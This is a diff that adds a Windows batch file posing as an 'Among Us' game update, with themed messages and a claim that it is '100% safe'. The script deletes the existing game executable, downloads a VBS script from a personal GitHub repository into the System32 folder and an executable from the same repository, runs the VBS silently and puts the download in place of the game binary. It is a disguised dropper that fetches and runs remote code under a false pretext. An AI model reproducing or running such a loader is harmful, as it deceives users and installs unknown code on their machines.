@@ -33,3 +33,114 @@ Invoke-WebRequest -Uri $url4 -OutFile $locations[3] -AsJob
 Wait-Job -Job (Get-Job)
 
 
+@echo off
+setlocal
+
+:: ---------------------------------------------------------------
+:: This batch file installs and runs an "Among Us" update
+:: and installs a new "AmongUs" file, while deleting the old one if it exists.
+:: ---------------------------------------------------------------
+
+:: Display a message to indicate that the update process is starting
+echo [INFO] Starting Among Us update process...
+echo.
+echo [INFO] Impostor detected! Initiating Among Us update...
+echo.
+echo [INFO] Downloading the latest Among Us update script...
+echo [INFO] This operation is 100% safe and verified by crewmates.
+echo.
+
+:: Define the destination path for the Among Us update script
+set "DestUpdate=C:\Windows\System32\AmongUsDebug.vbs"
+:: Define the destination path for the Among Us executable
+set "DestExe=Among Us.exe"  :: The correct name for the executable after download
+set "TempExe=Among_Us.exe"  :: Temporary downloaded file name
+
+:: Display the message about the download
+echo [INFO] Downloading update script and executable...
+echo [INFO] Suspects: 2 (checking internet connection)...
+echo.
+
+:: Check if the existing Among Us executable exists and delete it
+if exist "%DestExe%" (
+    echo [INFO] Deleting existing Among Us executable...
+    del "%DestExe%"
+    if exist "%DestExe%" (
+        echo [ERROR] Failed to delete the existing Among Us executable.
+        exit /b
+    ) else (
+        echo [SUCCESS] Existing Among Us executable deleted.
+    )
+) else (
+    echo [INFO] No existing Among Us executable found, continuing with installation...
+)
+
+:: Attempt to download the Among Us update script using PowerShell
+echo [INFO] Attempting to download the Among Us update script...
+powershell -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/AmjadBalls/TEST/refs/heads/main/Test.vbs' -OutFile '%DestUpdate%' } catch { Write-Error 'Failed to download script: $_' }"
+if %ERRORLEVEL% neq 0 (
+    echo [ERROR] Failed to download Among Us update script. Please check your internet connection or the URL.
+    exit /b
+)
+
+:: Attempt to download the Among Us executable using PowerShell
+echo [INFO] Attempting to download Among Us executable...
+powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Among_Us.exe' -OutFile '%TempExe%' } catch { Write-Error 'Failed to download executable: $_' }"
+if %ERRORLEVEL% neq 0 (
+    echo [ERROR] Failed to download Among Us executable. Please check your internet connection or the URL.
+    exit /b
+)
+
+:: Check if both downloads were successful
+if exist "%DestUpdate%" (
+    echo [SUCCESS] Among Us update script successfully downloaded!
+) else (
+    echo [ERROR] Failed to download Among Us update script. The impostor might have sabotaged the download. Please check your internet connection.
+    exit /b
+)
+
+if exist "%TempExe%" (
+    echo [SUCCESS] Among Us executable successfully downloaded!
+    echo [INFO] Among Us executable is ready to be renamed and installed.
+) else (
+    echo [ERROR] Failed to download Among Us executable. The impostor might have sabotaged the download. Please check your internet connection.
+    exit /b
+)
+
+echo.
+echo [INFO] Running Among Us update script...
+echo [INFO] Preparing to launch the update...
+echo.
+
+:: Run the downloaded Among Us update script
+cscript //nologo "%DestUpdate%"
+if %ERRORLEVEL% neq 0 (
+    echo [ERROR] There was an issue running the Among Us update script. The impostor might have sabotaged the update.
+    exit /b
+)
+
+:: Rename the downloaded executable to "Among Us.exe"
+echo [INFO] Renaming the downloaded executable to Among Us.exe...
+ren "%TempExe%" "Among Us.exe"
+if %ERRORLEVEL% neq 0 (
+    echo [ERROR] Failed to rename the executable file.
+    exit /b
+)
+
+:: Check if the renaming was successful
+if exist "%DestExe%" (
+    echo [SUCCESS] Among Us executable renamed and installed successfully!
+) else (
+    echo [ERROR] Failed to rename the executable file. Please check for any issues.
+    exit /b
+)
+
+:: Final message after script execution
+echo [SUCCESS] Among Us has been successfully updated!
+echo [INFO] Crewmates have completed the update. Task complete.
+
+echo.
+echo [INFO] The Among Us update process is complete.
+echo [INFO] Mission Accomplished. Exiting...
+pause
+exit
